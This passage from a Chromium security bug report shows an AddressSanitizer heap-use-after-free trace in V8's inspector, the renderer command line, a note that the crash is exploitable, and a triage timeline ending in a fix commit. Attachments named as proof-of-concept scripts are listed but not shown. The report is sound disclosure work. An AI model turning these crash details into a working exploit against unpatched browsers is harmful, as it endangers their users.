    #42 0x00031c85c040 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), blink::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x11c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c85c040)
    #43 0x000312cc483c in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12cc483c)
    #44 0x000312d2c508 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2c508)
    #45 0x000312d2b8c0 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2b8c0)
    #46 0x000312bab74c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+0x228 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12bab74c)
    #47 0x000312d2d868 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2d868)
    #48 0x000312c51a8c in base::RunLoop::Run(base::Location const&)+0x430 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12c51a8c)
    #49 0x00031c7a5030 in content::RendererMain(content::MainFunctionParams)+0x8b4 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c7a5030)
    #50 0x00030f2e5404 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x42c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0xf2e5404)
    #51 0x00030f2e7584 in content::ContentMainRunnerImpl::Run()+0x53c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0xf2e7584)
    #52 0x00030f2e30d8 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x858 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0xf2e30d8)
    #53 0x00030f2e35c8 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0xf2e35c8)
    #54 0x000300005cb4 in ChromeMain+0x490 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x5cb4)
    #55 0x00010055cc94 in main+0x254 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer):arm64+0x100000c94)
    #56 0x00019c5b6b94 in start+0x17b8 (/usr/lib/dyld:arm64e+0x6b94)

0x6110000e9948 is located 200 bytes inside of 208-byte region [0x6110000e9880,0x6110000e9950)
freed by thread T0 here:
    #0 0x0001009b9074 in __asan_memmove+0x308c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x55074)
    #1 0x000306730f68 in std::__Cr::__hash_table<std::__Cr::__hash_value_type<int, std::__Cr::unique_ptr<v8_inspector::InjectedScript, std::__Cr::default_delete<v8_inspector::InjectedScript>>>, std::__Cr::__unordered_map_hasher<int, std::__Cr::pair<int const, std::__Cr::unique_ptr<v8_inspector::InjectedScript, std::__Cr::default_delete<v8_inspector::InjectedScript>>>, std::__Cr::hash<int>, std::__Cr::equal_to<int>>, std::__Cr::__unordered_map_equal<int, std::__Cr::pair<int const, std::__Cr::unique_ptr<v8_inspector::InjectedScript, std::__Cr::default_delete<v8_inspector::InjectedScript>>>, std::__Cr::equal_to<int>, std::__Cr::hash<int>>, std::__Cr::allocator<std::__Cr::pair<int const, std::__Cr::unique_ptr<v8_inspector::InjectedScript, std::__Cr::default_delete<v8_inspector::InjectedScript>>>>>::~__hash_table()+0xe4 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x6730f68)
    #2 0x00030672fb4c in v8_inspector::InspectedContext::~InspectedContext()+0x8c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x672fb4c)
    #3 0x0003067d1d60 in std::__Cr::__shared_ptr_pointer<v8_inspector::InspectedContext*, std::__Cr::shared_ptr<v8_inspector::InspectedContext>::__shared_ptr_default_delete<v8_inspector::InspectedContext, v8_inspector::InspectedContext>, std::__Cr::allocator<v8_inspector::InspectedContext>>::__on_zero_shared()+0x2c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67d1d60)
    #4 0x0003067c83ec in v8_inspector::V8InspectorImpl::contextCollected(int, int)+0x310 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67c83ec)
    #5 0x00031e690548 in blink::MainThreadDebugger::ContextWillBeDestroyed(blink::ScriptState*)+0x250 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1e690548)
    #6 0x00031c902b44 in blink::LocalWindowProxy::DisposeContext(blink::WindowProxy::Lifecycle, blink::WindowProxy::FrameReuseStatus)+0x5ac (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c902b44)
    #7 0x00031c910b0c in blink::WindowProxyManager::ClearForClose()+0x64 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c910b0c)
    #8 0x00031d9fb040 in blink::Frame::Detach(blink::FrameDetachType)+0x430 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1d9fb040)
    #9 0x00031e0e67ec in blink::HTMLFrameOwnerElement::DisconnectContentFrame()+0x18c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1e0e67ec)
    #10 0x00031dabc674 in blink::ChildFrameDisconnector::DisconnectCollectedFrameOwners()+0x210 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1dabc674)
    #11 0x00032084070c in blink::ContainerNode::WillRemoveChild(blink::Node&)+0x25c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x2084070c)
    #12 0x00032083ece8 in blink::ContainerNode::RemoveChild(blink::Node*, blink::ExceptionState&)+0x224 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x2083ece8)
    #13 0x0003214497cc in blink::(anonymous namespace)::v8_element::RemoveOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&)+0x190 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x214497cc)
    #14 0x0003f7dd0354  (<unknown module>)
    #15 0x0003f7dce344  (<unknown module>)
    #16 0x0003f7dcb340  (<unknown module>)
    #17 0x0003f7dcb038  (<unknown module>)
    #18 0x0003047705c4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&)+0x1b90 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x47705c4)
    #19 0x00030476e9a0 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>)+0x170 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x476e9a0)
    #20 0x0003047eca2c in v8::internal::ErrorUtils::FormatStackTrace(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Object>)+0x49c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x47eca2c)
    #21 0x0003047f4390 in v8::internal::ErrorUtils::GetFormattedStack(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>)+0x43c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x47f4390)
    #22 0x000304483480 in v8::internal::Accessors::ErrorStackGetter(v8::FunctionCallbackInfo<v8::Value> const&)+0x124 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x4483480)
    #23 0x000304489e50 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool)+0x270 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x4489e50)
    #24 0x0003044886d8 in v8::internal::Builtins::InvokeApiFunction(v8::internal::Isolate*, bool, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>, v8::internal::DirectHandle<v8::internal::HeapObject>)+0x1274 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x44886d8)
    #25 0x000304770220 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&)+0x17ec (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x4770220)
    #26 0x00030476e9a0 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>)+0x170 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x476e9a0)
    #27 0x0003052c16e4 in v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator*)+0x6cc (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x52c16e4)
    #28 0x0003052bf89c in v8::internal::Object::GetProperty(v8::internal::LookupIterator*, bool)+0x20c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x52bf89c)
    #29 0x0003056e9588 in v8::internal::Runtime::GetObjectProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, bool*)+0x178 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x56e9588)

previously allocated by thread T0 here:
    #0 0x0001009b8f84 in __asan_memmove+0x2f9c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x54f84)
    #1 0x0003295d857c in operator new(unsigned long)+0x18 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x295d857c)
    #2 0x0003067303b0 in v8_inspector::InspectedContext::createInjectedScript(int)+0xc0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67303b0)
    #3 0x0003067d5fbc in v8_inspector::V8InspectorSessionImpl::findInjectedScript(int, v8_inspector::InjectedScript*&)+0x174 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67d5fbc)
    #4 0x00030677f8cc in v8_inspector::V8DebuggerAgentImpl::currentCallFrames(std::__Cr::unique_ptr<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Debugger::CallFrame, std::__Cr::default_delete<v8_inspector::protocol::Debugger::CallFrame>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Debugger::CallFrame, std::__Cr::default_delete<v8_inspector::protocol::Debugger::CallFrame>>>>, std::__Cr::default_delete<std::__Cr::vector<std::__Cr::unique_ptr<v8_inspector::protocol::Debugger::CallFrame, std::__Cr::default_delete<v8_inspector::protocol::Debugger::CallFrame>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::protocol::Debugger::CallFrame, std::__Cr::default_delete<v8_inspector::protocol::Debugger::CallFrame>>>>>>*)+0x520 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x677f8cc)
    #5 0x000306767c40 in v8_inspector::V8DebuggerAgentImpl::didPause(int, v8::Local<v8::Value>, std::__Cr::vector<int, std::__Cr::allocator<int>> const&, v8::debug::ExceptionType, bool, v8::base::EnumSet<v8::debug::BreakReason, int>)+0x14c0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x6767c40)
    #6 0x0003067c7bbc in v8_inspector::V8InspectorImpl::forEachSession(int, std::__Cr::function<void (v8_inspector::V8InspectorSessionImpl*)> const&)+0x488 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x67c7bbc)
    #7 0x00030679d6d0 in v8_inspector::V8Debugger::handleProgramBreak(v8::Local<v8::Context>, v8::Local<v8::Value>, std::__Cr::vector<int, std::__Cr::allocator<int>> const&, v8::base::EnumSet<v8::debug::BreakReason, int>, v8::debug::ExceptionType, bool)+0x5c4 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x679d6d0)
    #8 0x0003046889d4 in v8::internal::Debug::OnDebugBreak(v8::internal::DirectHandle<v8::internal::FixedArray>, v8::internal::StepAction, v8::base::EnumSet<v8::debug::BreakReason, int>)+0x594 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x46889d4)
    #9 0x0003046a0cb0 in v8::internal::Debug::HandleDebugBreak(v8::internal::IgnoreBreakMode, v8::base::EnumSet<v8::debug::BreakReason, int>)+0x814 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x46a0cb0)
    #10 0x0003056892e0 in v8::internal::Runtime_HandleDebuggerStatement(int, unsigned long*, v8::internal::Isolate*)+0x9c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x56892e0)
    #11 0x0003f7e7bd48  (<unknown module>)
    #12 0x0003f7f87cb8  (<unknown module>)
    #13 0x0003f7dce344  (<unknown module>)
    #14 0x0003f7dce344  (<unknown module>)
    #15 0x0003f7dcb340  (<unknown module>)
    #16 0x0003f7dcb038  (<unknown module>)
    #17 0x0003047705c4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&)+0x1b90 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x47705c4)
    #18 0x00030476e9a0 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>)+0x170 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x476e9a0)
    #19 0x0003043b141c in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*)+0x3a0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x43b141c)
    #20 0x00031c8e5f78 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*)+0x590 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c8e5f78)
    #21 0x000321221b38 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*)+0x210 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x21221b38)
    #22 0x0003212365c8 in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&)+0x534 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x212365c8)
    #23 0x000321236d58 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::BasicHeapVector<(blink::internal::HeapCollectionType)1, blink::ScriptValue, 0u> const&)+0x184 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x21236d58)
    #24 0x0003221f2530 in blink::ScheduledAction::Execute(blink::ExecutionContext*)+0x45c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x221f2530)
    #25 0x0003221f7b28 in blink::DOMTimer::Fired()+0x500 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x221f7b28)
    #26 0x00032044613c in blink::TimerBase::RunInternal()+0xb0 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x2044613c)
    #27 0x00031c85c040 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::TimerBase::*&&)(), blink::TimerBase*>, base::internal::BindState<true, true, false, void (blink::TimerBase::*)(), blink::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x11c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x1c85c040)
    #28 0x000312cc483c in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12cc483c)
    #29 0x000312d2c508 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x12d2c508)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x671716c) in v8_inspector::InjectedScript::wrapObjectMirror(v8_inspector::ValueMirror const&, v8_inspector::String16 const&, v8_inspector::WrapOptions const&, v8::MaybeLocal<v8::Value>, int, std::__Cr::unique_ptr<v8_inspector::protocol::Runtime::RemoteObject, std::__Cr::default_delete<v8_inspector::protocol::Runtime::RemoteObject>>*)+0xbfc
Shadow bytes around the buggy address:
  0x6110000e9680: 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa fa
  0x6110000e9700: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x6110000e9780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000e9800: fd fd fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
  0x6110000e9880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x6110000e9900: fd fd fd fd fd fd fd fd fd[fd]fa fa fa fa fa fa
  0x6110000e9980: fa fa fa fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x6110000e9a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000e9a80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa f7 fa
  0x6110000e9b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x6110000e9b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==7173==ADDITIONAL INFO

==7173==Note: Please include this section with the ASan report.
Task trace:
    #0 0x0003160de6cc in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*)+0x7c4 (/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Chromium Framework:arm64+0x160de6cc)


Command line: `/Users/alisa/Documents/Code/googlestuff/chrome-asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7779.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer) --type=renderer --user-data-dir=/tmp/chrome-asan --no-sandbox --file-url-path-alias=/gen=/Users/alisa/Documents/Code/googlestuff/chrome-asan/gen --js-flags=--expose-gc --allow-natives-syntax --enable-blink-features=MojoJS,MojoJSTest --lang=en-US --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=67 --time-ticks-at-unix-epoch=-1775925858331855 --launch-time-ticks=488648505843 --shared-files --metrics-shmem-handle=1752395122,r,13200767321502020156,8087822750979582627,2097152 --field-trial-handle=1718379636,r,11048359909989359910,6745670114945284298,262144 --enable-features=WebMachineLearningNeuralNetwork,WebNNCoreMLExplicitGPUOrNPU --disable-features=WebNNCoreML --variations-seed-version --pseudonymization-salt-handle=1935764596,r,13434608299011006442,11257493517387136236,4 --trace-process-track-uuid=3190709049093675377 --enable-logging=stderr --v=1`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==7173==END OF ADDITIONAL INFO

==7173==ABORTING

```

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?  

Reporter credit: Alisa Esage (@alisaesage)

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 41.9 KB)
- [server.py](attachments/server.py) (text/x-python, 640 B)
- [testcase.html](attachments/testcase.html) (text/html, 299 B)
- [poc_regctl.py](attachments/poc_regctl.py) (text/x-python, 3.0 KB)
- [windbg_41_v8inspector.txt](attachments/windbg_41_v8inspector.txt) (text/plain, 19.0 KB)
- [gm_object.diff](attachments/gm_object.diff) (text/x-diff, 5.9 KB)
- [poc_aaw_b.py](attachments/poc_aaw_b.py) (text/x-python, 11.3 KB)
- [windbg_v8inspector_cafebabe.log](attachments/windbg_v8inspector_cafebabe.log) (text/plain, 16.5 KB)

## Timeline

### al...@gmail.com (2026-04-17)

Commit that introduced the issue: <https://chromium.googlesource.com/v8/v8/+/e08e97347454255a337dcea361808fb25ca09077> (introduced getErrorProperty)

### an...@chromium.org (2026-04-17)

Forwarding to V8 shepherd.
May be related to <https://issues.chromium.org/486927780>

### ch...@google.com (2026-04-18)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-18)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### ar...@google.com (2026-04-20)

Thanks for the report. I was able to reproduce the crash on Linux x64, re-assigning to DevTools for further triaging, Danilo CYPTAL?

### ch...@google.com (2026-04-20)

Per [TaskFloss taxonomy](http://go/taskfloss-taxonomy#backlogs) assigned issues must never sit on backlogs, because backlogs are reserved for issues that aren't currently being worked on - and are therefore in state "New" or "Won't Fix (Inactive)".

### ch...@google.com (2026-04-20)

This issue has been identified as a security vulnerability and added to the team goal for addressing such issues (["High-priority and security bugs are promptly fixed"](http://b/483246889)). This helps ensure it receives the necessary attention and tracking.

### ch...@google.com (2026-04-21)

Per [TaskFloss taxonomy](http://go/taskfloss-taxonomy#iterations) all "In Progress (Accepted)" issues must be assigned to the current TaskFlow iteration, hence we automatically added this issue to the [current iteration](https://taskflow.corp.google.com/workspaces/3086587/iterations/5363249).

### dx...@google.com (2026-04-22)

Project: v8/v8  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7780292>

Hold a shared pointer to InspectedContext in InjectedScript::ContextScope.

